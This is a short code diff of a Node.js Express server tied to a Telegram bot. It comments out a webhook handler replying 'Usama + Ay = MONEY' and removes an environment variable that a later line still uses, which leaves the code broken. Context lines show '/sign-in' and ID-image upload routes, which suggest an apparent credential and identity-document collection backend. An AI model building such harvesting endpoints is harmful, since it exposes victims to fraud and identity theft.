@@ -10,7 +10,7 @@ const TelegramBot = require('node-telegram-bot-api');
 
 
 
-const {TOKEN, SERVER_URL} = process.env
+const {TOKEN} = process.env
 const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}`
 const URI = `/webhook/${TOKEN}`
 const WEBHOOK_URL = SERVER_URL + URI
@@ -41,11 +41,11 @@ app.get('/', (req, res)=> {
 })
 
 // to get info about the bot
-app.post(URI, async(req, res)=> {
-    console.log(req.body)
+// app.post(URI, async(req, res)=> {
+//     console.log(req.body)
 
-    return res.send('Usama + Ay = MONEY ')
-})
+//     return res.send('Usama + Ay = MONEY ')
+// })
 
 // sign in data
 app.post('/sign-in' ,async(req, res)=> { 
@@ -108,5 +108,5 @@ app.post('/dl', upload.single('front_Id') ,async(req, res)=> {
 
 app.listen(process.env.PORT || 5000, async()=> {
     console.log(`app is running on port, ${process.env.PORT || 5000}`)
-    await init();
+    // await init();
 })
